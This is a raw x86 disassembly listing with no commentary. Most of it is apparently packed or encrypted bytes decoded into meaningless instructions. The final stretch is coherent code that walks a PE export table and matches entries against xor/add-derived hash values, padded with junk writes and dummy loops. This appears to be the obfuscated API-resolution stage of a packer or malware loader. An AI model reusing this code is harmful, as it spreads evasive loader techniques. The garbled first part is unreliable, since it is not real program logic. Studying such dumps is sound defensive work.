  40ea7b:	lock jp 0x40eaa5
  40ea7e:	aad    0x1e
  40ea80:	out    0x7b,al
  40ea82:	lods   al,BYTE PTR ds:[esi]
  40ea83:	push   cs
  40ea84:	dec    ecx
  40ea85:	push   ebx
  40ea86:	and    eax,0x34d2596a
  40ea8b:	shl    BYTE PTR [ebx+0x78acb432],1
  40ea91:	and    eax,0x37e4ba7b
  40ea96:	cld    
  40ea97:	fwait
  40ea98:	sub    edx,DWORD PTR [ecx]
  40ea9a:	bound  ebp,QWORD PTR [ecx+0xe]
  40ea9d:	xchg   ebx,eax
  40ea9e:	ins    DWORD PTR es:[edi],dx
  40ea9f:	push   esi
  40eaa0:	inc    esp
  40eaa1:	rcl    BYTE PTR [ebx+eax*1+0x70b22f9d],0xb2
  40eaa9:	fstp   st(2)
  40eaab:	push   esi
  40eaac:	pop    DWORD PTR [ecx-0x4aec95cc]
  40eab2:	jge    0x40eb18
  40eab4:	(bad)  
  40eab5:	adc    edx,ebx
  40eab7:	cmc    
  40eab8:	aaa    
  40eab9:	fisubr DWORD PTR [ebx]
  40eabb:	out    dx,eax
  40eabc:	mov    ch,BYTE PTR [ebx-0x2d]
  40eabf:	loop   0x40eaed
  40eac1:	pop    esi
  40eac2:	mov    bh,0xc6
  40eac4:	ins    DWORD PTR es:[edi],dx
  40eac5:	bound  edx,QWORD PTR [ebx+0x6]
  40eac8:	rol    DWORD PTR [esi-0x9e57af1],1
  40eace:	loope  0x40eaf0
  40ead0:	add    BYTE PTR [ecx],0xd0
  40ead3:	jp     0x40ea88
  40ead5:	gs mov ch,0xa9
  40ead8:	pmaddwd mm3,QWORD PTR [ebx+0x4e142a00]
  40eadf:	push   0x3efa29e5
  40eae4:	nop
  40eae5:	fs adc al,0xb3
  40eae8:	hlt    
  40eae9:	loope  0x40ea6f
  40eaeb:	in     eax,dx
  40eaec:	(bad)  
  40eaed:	scas   al,BYTE PTR es:[edi]
  40eaee:	xchg   ecx,eax
  40eaef:	jle    0x40eb56
  40eaf1:	jno    0x40eb16
  40eaf3:	leave  
  40eaf4:	pop    ds
  40eaf5:	jnp    0x40eaa7
  40eaf7:	sbb    BYTE PTR [ebx+0x26],0x2e
  40eafb:	adc    esp,DWORD PTR [edx+0x1ac415df]
  40eb01:	std    
  40eb02:	adc    DWORD PTR [esi-0x74ac9ea8],ebx
  40eb08:	stos   DWORD PTR es:[edi],eax
  40eb09:	mov    edi,0xd6ee1e1e
  40eb0e:	pop    edi
  40eb0f:	ja     0x40eb1c
  40eb11:	repnz lds esi,FWORD PTR [edx]
  40eb14:	jae    0x40eaac
  40eb16:	enter  0xd81f,0x9c
  40eb1a:	popa   
  40eb1b:	dec    edx
  40eb1c:	in     al,0x56
  40eb1e:	mov    dh,0x30
  40eb20:	mov    dl,0x8c
  40eb22:	bound  edx,QWORD PTR ds:0x81aa221c
  40eb28:	xchg   edi,eax
  40eb29:	fistp  WORD PTR [esp+eax*2+0xde32469]
  40eb30:	mov    WORD PTR [ebx],gs
  40eb32:	or     ecx,DWORD PTR [edx+0x30cf4166]
  40eb38:	cs add ecx,esi
  40eb3b:	sti    
  40eb3c:	xor    al,0x72
  40eb3e:	adc    ebp,ebx
  40eb40:	xor    ah,dh
  40eb42:	sbb    al,0xd7
  40eb44:	(bad)  
  40eb45:	out    dx,al
  40eb46:	mov    ecx,0xf45e601b
  40eb4b:	mov    dh,0x1f
  40eb4d:	xor    ecx,DWORD PTR cs:[eax+0x5a767594]
  40eb54:	or     BYTE PTR [eax],dh
  40eb56:	add    al,0x58
  40eb59:	xchg   esp,eax
  40eb5a:	retf   
  40eb5b:	sbb    eax,0xe216c439
  40eb60:	les    esp,FWORD PTR [ecx+0x6fc4c421]
  40eb66:	lahf   
  40eb67:	pop    eax
  40eb68:	sbb    al,0xd8
  40eb6a:	test   DWORD PTR [edx+0x5733bc2a],edi
  40eb70:	aam    0x96
  40eb72:	push   cs
  40eb73:	sahf   
  40eb74:	fwait
  40eb75:	and    bl,dl
  40eb77:	stos   BYTE PTR es:[edi],al
  40eb78:	mov    esp,0xf71b3fda
  40eb7d:	mov    eax,ds:0xbf571c93
  40eb82:	pop    esp
  40eb83:	pop    ds
  40eb84:	hlt    
  40eb85:	ror    BYTE PTR [eax],cl
  40eb87:	mov    edi,0x458aa317
  40eb8c:	loopne 0x40ec02
  40eb8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb8f:	mov    ecx,0x687e654f
  40eb94:	mov    ch,0x18
  40eb96:	ret    
  40eb97:	inc    ebp
  40eb98:	ins    DWORD PTR es:[edi],dx
  40eb99:	jp     0x40ebcc
  40eb9b:	mov    WORD PTR ds:0xa3adfc03,?
  40eba1:	xlat   BYTE PTR ds:[ebx]
  40eba2:	jle    0x40ebb5
  40eba4:	imul   ecx,DWORD PTR [edx-0x6886d75],0xffffffd4
  40ebab:	test   DWORD PTR [ebp+0x4f],eax
  40ebae:	xchg   esp,eax
  40ebaf:	pop    ds
  40ebb0:	out    0xed,al
  40ebb2:	xor    al,BYTE PTR [ebx+0x30]
  40ebb5:	mov    al,0xdd
  40ebb7:	(bad)  
  40ebb8:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40ebba:	pusha  
  40ebbb:	jmp    0x738b2d8b
  40ebc0:	and    edx,DWORD PTR [edx]
  40ebc2:	aaa    
  40ebc3:	sub    bh,ch
  40ebc5:	mov    dl,al
  40ebc7:	adc    dl,ah
  40ebc9:	fist   WORD PTR ds:0x5df71f78
  40ebcf:	(bad)  
  40ebd0:	jne    0x40eba1
  40ebd2:	mov    WORD PTR [esi+0x29],fs
  40ebd5:	push   0x11
  40ebd7:	ret    
  40ebd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebd9:	push   es
  40ebda:	rcl    BYTE PTR ds:0x40c0bc6d,1
  40ebe0:	push   0xffffffbe
  40ebe2:	iret   
  40ebe3:	mov    DWORD PTR [ecx-0x3b6bcfa1],edx
  40ebe9:	mov    dh,0xfb
  40ebeb:	dec    eax
  40ebec:	sub    bh,dl
  40ebee:	xor    DWORD PTR [edx-0x3a],ebp
  40ebf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebf2:	fucomi st,st(4)
  40ebf4:	adc    ah,BYTE PTR [edi-0x5d]
  40ebf7:	hlt    
  40ebf8:	fnstenv [ecx+0x2414b1c4]
  40ebfe:	retf   
  40ebff:	ret    
  40ec00:	sbb    al,0x9f
  40ec02:	mov    cl,0x41
  40ec04:	arpl   WORD PTR [ebx],dx
  40ec06:	lahf   
  40ec07:	add    BYTE PTR [esi-0x4c3398a9],bh
  40ec0d:	adc    edx,DWORD PTR [ebp+0xb4ecbac]
  40ec13:	ds rol edi,1
  40ec16:	adc    eax,0x8e457984
  40ec1b:	push   esp
  40ec1c:	sti    
  40ec1d:	and    al,0x7a
  40ec1f:	(bad)  
  40ec20:	mov    ds:0x6a297ba1,al
  40ec25:	mov    al,ds:0x232b2a15
  40ec2a:	loopne 0x40ebc9
  40ec2c:	jp     0x40ec2c
  40ec2e:	cmp    DWORD PTR [edi+0x52727853],ebp
  40ec34:	sub    al,0x25
  40ec36:	xchg   esi,ecx
  40ec38:	in     eax,dx
  40ec39:	in     al,0xea
  40ec3b:	sbb    al,0x1d
  40ec3d:	sbb    BYTE PTR [ebx+ebx*4],dl
  40ec40:	jmp    0x40ebde
  40ec42:	and    BYTE PTR [esi],ch
  40ec44:	lds    ebp,FWORD PTR [eax-0x16]
  40ec47:	icebp  
  40ec48:	test   al,0xc2
  40ec4a:	sbb    dh,BYTE PTR [edi-0x49dca060]
  40ec50:	fisubr DWORD PTR [ebp-0x1c811389]
  40ec56:	nop
  40ec57:	sbb    al,0xb5
  40ec59:	add    eax,0xefaea471
  40ec5e:	popf   
  40ec5f:	xchg   DWORD PTR [esi+eiz*8-0x28],edi
  40ec63:	cmp    bl,BYTE PTR [ebx]
  40ec65:	lods   al,BYTE PTR ds:[esi]
  40ec66:	shl    DWORD PTR [ebp+0x517f766e],cl
  40ec6c:	mov    eax,0x865db2e8
  40ec71:	ss mov ecx,0x2429ee21
  40ec77:	cs sbb al,0xe1
  40ec7a:	test   DWORD PTR fs:[eax-0x8dff470],esi
  40ec81:	mov    WORD PTR [esi-0x32d3e860],ds
  40ec87:	mov    ds:0x9b9bb544,al
  40ec8c:	inc    ebp
  40ec8d:	ss add eax,0xd7d67039
  40ec93:	ret    0xe0d1
  40ec96:	adc    al,0x80
  40ec98:	adc    DWORD PTR [ecx-0x65be34a3],ebp
  40ec9e:	nop
  40ec9f:	lahf   
  40eca0:	rol    esi,cl
  40eca2:	scas   al,BYTE PTR es:[edi]
  40eca3:	mov    DWORD PTR [edx-0x74227fc],ebx
  40eca9:	and    DWORD PTR [edi],ebx
  40ecab:	add    eax,0x17ed325f
  40ecb0:	adc    bh,BYTE PTR [edx-0x63b362e1]
  40ecb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecb7:	adc    eax,0x591e0ab8
  40ecbc:	out    dx,eax
  40ecbd:	inc    edi
  40ecbe:	lea    esp,[edi]
  40ecc0:	lock mov ebp,ebp
  40ecc3:	xor    eax,0xf4dab8ff
  40ecc8:	jp     0x40ec9e
  40ecca:	and    BYTE PTR [ebx-0x4991b111],cl
  40ecd0:	push   eax
  40ecd1:	repnz fisubr DWORD PTR [ecx+0x4d]
  40ecd5:	mov    edi,0x8cf58323
  40ecda:	pop    edi
  40ecdb:	cmp    ebx,ebp
  40ecdd:	add    edx,DWORD PTR [ebx+0x412298e8]
  40ece3:	retf   0x50ed
  40ece6:	xchg   ebp,eax
  40ece7:	push   esi
  40ece8:	rol    BYTE PTR [ebp-0x547f1b4a],0x14
  40ecef:	inc    edx
  40ecf0:	pop    edi
  40ecf1:	xor    DWORD PTR [ebp+0x2bf33220],esp
  40ecf7:	les    edx,FWORD PTR [edi]
  40ecf9:	or     al,0x4e
  40ecfb:	popa   
  40ecfc:	xor    eax,0xc82a9801
  40ed01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed02:	js     0x40ecd8
  40ed04:	dec    edi
  40ed05:	mov    ah,0x71
  40ed07:	jmp    0xe67522bc
  40ed0c:	cmp    cl,BYTE PTR [edx-0x17f1e99d]
  40ed12:	dec    ebx
  40ed13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed14:	outs   dx,BYTE PTR ds:[esi]
  40ed15:	inc    ebp
  40ed16:	cmp    BYTE PTR [esp+edi*2],cl
  40ed19:	xchg   BYTE PTR [edi-0x39],ch
  40ed1c:	mov    WORD PTR [ebx+0x65],gs
  40ed1f:	cmc    
  40ed20:	and    eax,0x964c15fa
  40ed25:	xchg   esi,eax
  40ed26:	jecxz  0x40ed54
  40ed28:	cli    
  40ed29:	lock xchg edi,eax
  40ed2b:	xchg   ebx,eax
  40ed2c:	pop    esp
  40ed2d:	add    esp,DWORD PTR [edx-0x71]
  40ed30:	adc    ecx,esp
  40ed32:	sub    al,bh
  40ed34:	sbb    dl,BYTE PTR [ebp-0x70be9e09]
  40ed3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed3b:	ins    BYTE PTR es:[edi],dx
  40ed3c:	dec    edx
  40ed3d:	sbb    bh,BYTE PTR [eax]
  40ed3f:	aaa    
  40ed40:	mov    esi,0x532569e6
  40ed45:	push   cs
  40ed46:	dec    ebp
  40ed47:	and    al,cl
  40ed49:	jmp    0x40ed26
  40ed4b:	scas   eax,DWORD PTR es:[edi]
  40ed4c:	lahf   
  40ed4d:	mov    dh,0x30
  40ed4f:	pop    ebp
  40ed50:	mov    al,ds:0x97ef10e6
  40ed55:	test   BYTE PTR [eax-0x5b5d6a],dh
  40ed5b:	imul   edi,ebp,0xa6940cb5
  40ed61:	jo     0x40ed06
  40ed63:	sti    
  40ed64:	dec    esi
  40ed65:	or     ecx,DWORD PTR [esi+0x231b2a0e]
  40ed6b:	push   0x1a
  40ed6d:	cmp    eax,0x840fac92
  40ed72:	fcmovnu st,st(3)
  40ed74:	out    0xa2,eax
  40ed76:	mov    bl,0x56
  40ed78:	push   esi
  40ed79:	pop    esp
  40ed7a:	pushf  
  40ed7b:	in     eax,0x66
  40ed7d:	sar    BYTE PTR [ebx+0x47],cl
  40ed80:	adc    ah,BYTE PTR [ecx]
  40ed82:	adc    edx,DWORD PTR [ecx]
  40ed84:	aad    0x70
  40ed86:	(bad)  
  40ed87:	out    0xe9,eax
  40ed89:	in     eax,0x4f
  40ed8b:	sub    BYTE PTR [edi+eax*8],bl
  40ed8e:	(bad)  
  40ed8f:	mul    DWORD PTR [eax]
  40ed91:	adc    BYTE PTR [ebx],dh
  40ed93:	push   es
  40ed94:	jmp    0x40ed1c
  40ed96:	imul   edi,DWORD PTR [ecx],0x11580217
  40ed9c:	fidivr WORD PTR [ebx+eax*4]
  40ed9f:	xchg   DWORD PTR [ecx+0x1d4e5716],edx
  40eda5:	int    0xa1
  40eda7:	push   ds
  40eda8:	fnstenv [edx]
  40edaa:	and    al,0xbc
  40edac:	mov    ah,0x64
  40edae:	js     0x40ed7a
  40edb0:	ret    
  40edb1:	pop    esi
  40edb2:	mov    edi,0xdc888a69
  40edb7:	icebp  
  40edb8:	(bad)  [edi]
  40edba:	mov    ebp,0x305d52
  40edbf:	sbb    edx,ebp
  40edc1:	and    al,0xc0
  40edc3:	int    0x14
  40edc5:	cmp    eax,0xa2698aad
  40edca:	call   0xc9f7:0x77a2f6db
  40edd1:	lods   eax,DWORD PTR ds:[esi]
  40edd2:	or     dh,BYTE PTR [esi-0x6b]
  40edd5:	inc    ebp
  40edd6:	pop    ss
  40edd7:	shr    DWORD PTR [ebx+esi*2-0x10b84799],1
  40edde:	in     al,0xe
  40ede0:	mov    WORD PTR [ebp+eiz*2-0x7c],es
  40ede4:	inc    ecx
  40ede5:	mov    edi,0x44483511
  40edea:	cwde   
  40edeb:	inc    ebp
  40edec:	enter  0x3472,0xf0
  40edf0:	and    ecx,DWORD PTR ds:0xc8dbe9a6
  40edf6:	(bad)  
  40edf7:	mov    ecx,edx
  40edf9:	ins    DWORD PTR es:[edi],dx
  40edfa:	mov    bl,0xe6
  40edfc:	or     ah,0x1
  40edff:	out    dx,eax
  40ee00:	push   esi
  40ee01:	lock push edi
  40ee03:	mov    cl,BYTE PTR [esi]
  40ee05:	ret    
  40ee06:	lock push edi
  40ee08:	adc    al,0xf0
  40ee0a:	in     al,0xc6
  40ee0c:	or     al,0x38
  40ee0e:	lock dec eax
  40ee10:	leave  
  40ee11:	xchg   ebp,eax
  40ee12:	ficom  WORD PTR [edx+0x16]
  40ee15:	jnp    0x40edc9
  40ee17:	pop    ds
  40ee18:	mov    eax,ds:0xad3dac1a
  40ee1d:	dec    edx
  40ee1e:	pop    esi
  40ee1f:	shr    BYTE PTR [esi+0x12],1
  40ee22:	sub    al,0x2
  40ee24:	mov    ds:0x396c801b,eax
  40ee29:	sbb    al,0x5d
  40ee2b:	fnstcw WORD PTR [edx-0x13]
  40ee2e:	clc    
  40ee2f:	mov    WORD PTR [ebx+0x3adc0e4b],?
  40ee35:	mov    WORD PTR [ebx],gs
  40ee37:	cwde   
  40ee38:	data16 sahf 
  40ee3a:	mov    ah,0xf5
  40ee3c:	xchg   esp,eax
  40ee3d:	pop    eax
  40ee3e:	(bad)  
  40ee3f:	mov    esi,edx
  40ee41:	sbb    ah,BYTE PTR [edx-0x68fa3959]
  40ee47:	mov    cl,0x94
  40ee49:	adc    BYTE PTR [eax+0x3f6c551d],ah
  40ee4f:	neg    DWORD PTR [edi]
  40ee51:	xor    edi,esp
  40ee53:	sar    DWORD PTR [eax],0x2f
  40ee56:	mov    DWORD PTR [edi-0x22e2ad68],0x9197f709
  40ee60:	mov    dl,0x6f
  40ee62:	addr16 mov eax,ds:0x9745
  40ee66:	mov    ds:0x1edb69bb,eax
  40ee6b:	rcr    eax,0xfa
  40ee6e:	hlt    
  40ee6f:	xchg   esp,eax
  40ee70:	or     dh,0x67
  40ee73:	mov    ebx,0xf47a4724
  40ee78:	sbb    BYTE PTR [ebp-0x1eedb0d3],dh
  40ee7e:	out    dx,eax
  40ee7f:	xor    eax,0x78b5e592
  40ee84:	icebp  
  40ee85:	lock scas al,BYTE PTR es:[edi]
  40ee87:	fld    DWORD PTR [esi+esi*8-0x23]
  40ee8b:	sar    DWORD PTR [edi+0x3],1
  40ee8e:	jmp    0x40ee92
  40ee90:	mov    BYTE PTR [edi+0x61],cl
  40ee93:	mov    ebp,0xd982a776
  40ee98:	mov    cl,0xab
  40ee9a:	out    dx,eax
  40ee9b:	xor    al,0x78
  40ee9d:	inc    ecx
  40ee9e:	fucomi st,st(6)
  40eea0:	hlt    
  40eea1:	ds pop eax
  40eea3:	test   BYTE PTR [eax+0x76518050],bl
  40eea9:	jae    0x40eea8
  40eeab:	imul   ecx,esi,0x18
  40eeae:	or     eax,0x85ed8fdf
  40eeb3:	daa    
  40eeb4:	pop    esi
  40eeb5:	call   DWORD PTR [edi+0x7ca33027]
  40eebb:	ret    
  40eebc:	mov    ch,0xce
  40eebe:	jl     0x40eee9
  40eec0:	xchg   ebp,eax
  40eec1:	pop    ds
  40eec2:	dec    esi
  40eec3:	pop    edx
  40eec4:	fprem1 
  40eec6:	and    cl,BYTE PTR [ecx]
  40eec8:	scas   eax,DWORD PTR es:[edi]
  40eec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeca:	dec    esi
  40eecb:	pop    edx
  40eecc:	cmp    DWORD PTR [edx-0x6e],ebp
  40eecf:	or     al,0x40
  40eed1:	push   edx
  40eed2:	sub    dh,BYTE PTR [esi+0x40]
  40eed5:	sub    al,0xdd
  40eed7:	fisubr DWORD PTR [ecx]
  40eed9:	pop    ecx
  40eeda:	pushf  
  40eedb:	mov    esp,0x6f36375a
  40eee0:	div    eax
  40eee2:	ja     0x40eee0
  40eee4:	hlt    
  40eee5:	fld    TBYTE PTR [ecx-0x49]
  40eee8:	inc    edi
  40eee9:	sbb    edi,edx
  40eeeb:	jmp    0xd1c7:0x87d9d876
  40eef2:	mov    ecx,0x5a35ee5
  40eef7:	jne    0x40eeed
  40eef9:	int3   
  40eefa:	sbb    al,0x72
  40eefc:	cli    
  40eefd:	daa    
  40eefe:	xchg   ebp,eax
  40eeff:	dec    esp
  40ef00:	inc    esi
  40ef01:	push   ecx
  40ef02:	loop   0x40eeab
  40ef04:	pop    ds
  40ef05:	out    0x42,eax
  40ef07:	inc    edi
  40ef08:	jae    0x40eee1
  40ef0a:	adc    eax,0xf6db131d
  40ef0f:	sub    DWORD PTR [ebp+0x46],edx
  40ef12:	dec    edi
  40ef13:	mov    cl,0xc5
  40ef15:	jle    0x40ee99
  40ef17:	lods   eax,DWORD PTR ds:[esi]
  40ef18:	mov    al,ds:0x97f5b4ef
  40ef1d:	xlat   BYTE PTR ds:[ebx]
  40ef1e:	mov    DWORD PTR [edi],esp
  40ef20:	popf   
  40ef21:	les    eax,FWORD PTR [edx]
  40ef23:	cmp    eax,esi
  40ef25:	sar    DWORD PTR [eax],cl
  40ef27:	es je  0x40ef69
  40ef2a:	lock (bad) 
  40ef2c:	(bad)  
  40ef2d:	jns    0x40ef88
  40ef2f:	xchg   edi,eax
  40ef30:	cli    
  40ef31:	jbe    0x40eef6
  40ef33:	pop    ss
  40ef34:	inc    edi
  40ef35:	mov    ch,0xd7
  40ef37:	jl     0x40ef7a
  40ef39:	daa    
  40ef3a:	(bad)  
  40ef3c:	mov    esi,ebp
  40ef3e:	cmc    
  40ef3f:	push   0x4fdd06c9
  40ef44:	jecxz  0x40ef8d
  40ef46:	cmp    edi,DWORD PTR [ecx]
  40ef48:	mov    eax,ds:0x670fc98b
  40ef4d:	dec    edx
  40ef4e:	call   0x726:0x80d78545
  40ef55:	hlt    
  40ef56:	jmp    0x40ef88
  40ef58:	jae    0x40ef83
  40ef5a:	mov    al,0x14
  40ef5c:	retf   
  40ef5d:	call   0xc0779e7
  40ef62:	cdq    
  40ef63:	icebp  
  40ef64:	ret    0x69a9
  40ef67:	lock loopne 0x40ef5d
  40ef6a:	pop    esp
  40ef6b:	not    BYTE PTR [edx]
  40ef6d:	iret   
  40ef6e:	push   edx
  40ef6f:	sahf   
  40ef70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef71:	add    eax,0xa994494f
  40ef76:	jle    0x40ef0b
  40ef78:	hlt    
  40ef79:	stc    
  40ef7a:	test   DWORD PTR [ebp-0x57],eax
  40ef7d:	dec    ebp
  40ef7e:	data16 add cl,BYTE PTR [ebx+0x66f6faa4]
  40ef85:	sti    
  40ef86:	pop    ss
  40ef87:	inc    ebp
  40ef88:	jae    0x40ef1a
  40ef8a:	xchg   ebp,eax
  40ef8b:	sbb    al,BYTE PTR [ebx+0x1faeea60]
  40ef91:	sbb    BYTE PTR [eax],0x14
  40ef94:	jl     0x40efa0
  40ef96:	pop    ebp
  40ef97:	clc    
  40ef98:	push   0x4f
  40ef9a:	jno    0x40ef3b
  40ef9c:	rol    DWORD PTR [edi+0x2e9916fa],1
  40efa2:	cdq    
  40efa3:	rcr    ebp,1
  40efa5:	sbb    DWORD PTR [ecx-0x51],0x1f
  40efa9:	push   esi
  40efaa:	in     eax,dx
  40efab:	cmp    DWORD PTR [esi],esi
  40efad:	retf   
  40efae:	sub    eax,0xe0015bb5
  40efb3:	(bad)  
  40efb5:	icebp  
  40efb6:	js     0x40ef55
  40efb8:	adc    eax,0x95e812f3
  40efbd:	inc    eax
  40efbe:	gs in  eax,dx
  40efc0:	iret   
  40efc1:	push   cs
  40efc2:	stos   DWORD PTR es:[edi],eax
  40efc3:	jl     0x40ef55
  40efc5:	imul   edi,DWORD PTR [esi+edx*8],0x1c7ee73f
  40efcc:	inc    eax
  40efcd:	in     eax,dx
  40efce:	adc    eax,0x5938dd0
  40efd3:	lea    ebx,[ebp+0x403581c8]
  40efd9:	push   0x68240042
  40efde:	inc    edx
  40efdf:	add    BYTE PTR [ebx],dh
  40efe1:	enter  0xd033,0xc7
  40efe5:	add    eax,0x426834
  40efea:	int    0x26
  40efec:	add    BYTE PTR [eax],al
  40efee:	cmp    edx,ecx
  40eff0:	mov    DWORD PTR ds:0x426820,0x2163
  40effa:	je     0x40f1e9
  40f000:	xor    ecx,ecx
  40f002:	or     ecx,DWORD PTR ds:0x4267e8
  40f008:	add    DWORD PTR ds:0x426800,ecx
  40f00e:	mov    eax,DWORD PTR [ebp-0x38]
  40f011:	mov    DWORD PTR ds:0x426844,0x1c
  40f01b:	cmp    DWORD PTR ds:0x426844,0x0
  40f022:	je     0x40f057
  40f028:	cmp    DWORD PTR ds:0x426844,0x1d
  40f02f:	jge    0x40f057
  40f035:	jmp    0x40f045
  40f03a:	push   0x30dd
  40f03f:	call   DWORD PTR ds:0x42579c
  40f045:	mov    ecx,DWORD PTR ds:0x426844
  40f04b:	dec    ecx
  40f04c:	mov    DWORD PTR ds:0x426844,ecx
  40f052:	jmp    0x40f01b
  40f057:	mov    ecx,DWORD PTR [ebp-0x34]
  40f05a:	xor    DWORD PTR ds:0x426810,0x69bf
  40f064:	xor    eax,esi
  40f066:	add    eax,edi
  40f068:	cmp    ebx,eax
  40f06a:	mov    DWORD PTR ds:0x4267e0,0x784f
  40f074:	jne    0x40f1c3
  40f07a:	push   DWORD PTR [ebp+0x8]
  40f07d:	call   0x425311
  40f082:	mov    DWORD PTR [ebp-0xc],eax
  40f085:	mov    eax,DWORD PTR [ebp-0x38]
  40f088:	adc    DWORD PTR ds:0x4267cc,0x5348
  40f092:	mov    ecx,DWORD PTR [ebp-0x34]
  40f095:	mov    ecx,DWORD PTR [ebp-0xc]
  40f098:	add    DWORD PTR ds:0x426830,0x4267f4
  40f0a2:	xor    eax,esi
  40f0a4:	sbb    DWORD PTR ds:0x4267f0,0x4267b4
  40f0ae:	add    eax,edi
  40f0b0:	cmp    ecx,eax
  40f0b2:	mov    DWORD PTR ds:0x426858,0x5679
  40f0bc:	je     0x40f260
  40f0c2:	push   DWORD PTR [ebp-0xc]
  40f0c5:	push   DWORD PTR [ebp+0x8]
  40f0c8:	add    DWORD PTR ds:0x4267fc,0x200a
  40f0d2:	call   0x425477
  40f0d7:	sub    ecx,DWORD PTR ds:0x426818
  40f0dd:	mov    DWORD PTR [ebp-0xc],eax
  40f0e0:	dec    DWORD PTR ds:0x426848
  40f0e6:	mov    eax,DWORD PTR [ebp-0x38]
  40f0e9:	mov    ecx,DWORD PTR [ebp-0x34]
  40f0ec:	or     ecx,DWORD PTR ds:0x4267f4
  40f0f2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f0f5:	xor    eax,esi
  40f0f7:	and    DWORD PTR ds:0x4267b4,0x4267b8
  40f101:	add    eax,edi
  40f103:	mov    DWORD PTR ds:0x4267b4,0x7d19
  40f10d:	cmp    ecx,eax
  40f10f:	je     0x40f260
  40f115:	or     eax,0x1665
  40f11a:	mov    eax,DWORD PTR [ebp-0xc]
  40f11d:	and    DWORD PTR ds:0x426838,0x0
  40f127:	jmp    0x40f139
  40f12c:	mov    ecx,DWORD PTR ds:0x426838
  40f132:	inc    ecx
  40f133:	mov    DWORD PTR ds:0x426838,ecx
  40f139:	cmp    DWORD PTR ds:0x426838,0x1f
  40f140:	jae    0x40f188
  40f146:	cmp    DWORD PTR ds:0x426838,0xf
  40f14d:	jle    0x40f188
  40f153:	jmp    0x40f169
  40f158:	push   DWORD PTR [ebp-0x28]
  40f15b:	push   DWORD PTR [ebp-0x14]
  40f15e:	push   0x5860
  40f163:	call   DWORD PTR ds:0x4257a0
  40f169:	cmp    DWORD PTR ds:0x426838,0xe
  40f170:	jne    0x40f183
  40f176:	mov    ecx,DWORD PTR ds:0x426838
  40f17c:	inc    ecx
  40f17d:	mov    DWORD PTR ds:0x426838,ecx
  40f183:	jmp    0x40f12c
  40f188:	mov    eax,DWORD PTR [eax+0x18]
  40f18b:	adc    DWORD PTR ds:0x42685c,edx
  40f191:	mov    DWORD PTR [ebp-0x1c],eax
  40f194:	adc    eax,DWORD PTR ds:0x4267bc
  40f19a:	mov    eax,DWORD PTR [ebp-0xc]
  40f19d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f1a0:	add    ecx,DWORD PTR [eax+0x20]
  40f1a3:	mov    DWORD PTR [ebp-0x24],ecx
  40f1a6:	mov    eax,DWORD PTR [ebp-0xc]
  40f1a9:	mov    ecx,DWORD PTR [ebp+0x8]
  40f1ac:	add    ecx,DWORD PTR [eax+0x24]
  40f1af:	mov    DWORD PTR [ebp-0x2c],ecx
  40f1b2:	mov    eax,DWORD PTR [ebp-0xc]
  40f1b5:	mov    ecx,DWORD PTR [ebp+0x8]
  40f1b8:	add    ecx,DWORD PTR [eax+0x1c]
  40f1bb:	mov    DWORD PTR [ebp-0xc],ecx
  40f1be:	jmp    0x40f222
  40f1c3:	mov    eax,DWORD PTR [ebp-0x24]
  40f1c6:	mov    ecx,DWORD PTR [ebp+0x8]
  40f1c9:	add    ecx,DWORD PTR [eax+ebx*4]
  40f1cc:	mov    DWORD PTR [ebp-0x20],ecx
  40f1cf:	mov    eax,DWORD PTR [ebp-0x38]
  40f1d2:	mov    ecx,DWORD PTR [ebp-0x34]
  40f1d5:	mov    ecx,DWORD PTR [ebp-0x20]
  40f1d8:	xor    eax,esi
  40f1da:	add    eax,edi
  40f1dc:	cmp    ecx,eax
  40f1de:	je     0x40f222
  40f1e4:	jmp    0x40f213
  40f1e9:	mov    eax,DWORD PTR [ebp-0x38]
  40f1ec:	mov    ecx,DWORD PTR [ebp-0x34]
  40f1ef:	mov    ecx,DWORD PTR [ebp-0x4]
  40f1f2:	xor    eax,esi
  40f1f4:	add    eax,edi
  40f1f6:	cmp    ecx,eax
  40f1f8:	mov    eax,DWORD PTR [ebp-0x38]
  40f1fb:	mov    ecx,DWORD PTR [ebp-0x34]
  40f1fe:	je     0x40f266
  40f204:	mov    ecx,DWORD PTR [ebp-0x28]
  40f207:	xor    eax,esi
  40f209:	add    eax,edi
  40f20b:	cmp    ecx,eax
  40f20d:	je     0x40f26f
  40f213:	lea    eax,[ebp-0x4]
  40f216:	push   eax
  40f217:	push   DWORD PTR [ebp-0x20]
  40f21a:	push   DWORD PTR [ebp+0xc]
  40f21d:	call   0x401000
  40f222:	mov    eax,DWORD PTR [ebp-0x38]
  40f225:	mov    ecx,DWORD PTR [ebp-0x34]
  40f228:	mov    ecx,DWORD PTR [ebp-0x4]
  40f22b:	xor    eax,esi
  40f22d:	add    eax,edi
  40f22f:	cmp    ecx,eax
  40f231:	je     0x40f24c
  40f237:	mov    eax,DWORD PTR [ebp-0x2c]
  40f23a:	movzx  eax,WORD PTR [eax+ebx*2]
  40f23e:	mov    ecx,DWORD PTR [ebp-0xc]
  40f241:	mov    eax,DWORD PTR [ecx+eax*4]
  40f244:	mov    DWORD PTR [ebp-0x30],eax
  40f247:	jmp    0x40f1e9
  40f24c:	mov    eax,DWORD PTR [ebp-0x40]
  40f24f:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f252:	xor    eax,esi
  40f254:	lea    ebx,[ebx+eax*1+0x56424137]
  40f25b:	jmp    0x40cbd2
  40f260:	mov    eax,DWORD PTR [ebp-0x38]
  40f263:	mov    ecx,DWORD PTR [ebp-0x34]
  40f266:	xor    eax,esi
  40f268:	add    eax,edi
  40f26a:	jmp    0x4181fe
  40f26f:	mov    eax,DWORD PTR [ebp-0x30]
  40f272:	add    eax,DWORD PTR [ebp+0x8]
  40f275:	mov    DWORD PTR [ebp-0x10],eax
  40f278:	mov    eax,DWORD PTR [ebp-0x14]
  40f27b:	test   eax,eax
  40f27d:	je     0x4116c1
